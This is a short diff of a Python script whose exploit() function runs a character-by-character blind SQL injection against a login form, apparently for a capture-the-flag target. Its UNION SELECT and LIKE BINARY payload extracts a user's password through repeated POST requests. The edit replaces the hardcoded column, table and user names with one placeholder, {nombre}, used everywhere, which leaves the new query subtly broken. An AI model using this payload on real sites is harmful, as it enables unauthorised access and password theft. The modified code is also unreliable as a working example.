@@ -9,7 +9,7 @@ def exploit():
     while True:                
         for letra in character:
             payload = {
-                'username':f"kitty' UNION SELECT 1, password, 3, 4 FROM mywebsite.siteusers WHERE username = 'kitty' AND password LIKE BINARY '{cadena}{letra}%' -- -",
+                'username':f"kitty' UNION SELECT 1, {nombre}, 3, 4 FROM {nombre}.{nombre} WHERE {nombre} = '{nombre}' AND {nombre} LIKE BINARY '{cadena}{letra}%' -- -",
                 'password':'ol'
             }
             solicitud = requests.post(main_ip,data=payload,allow_redirects=False)                
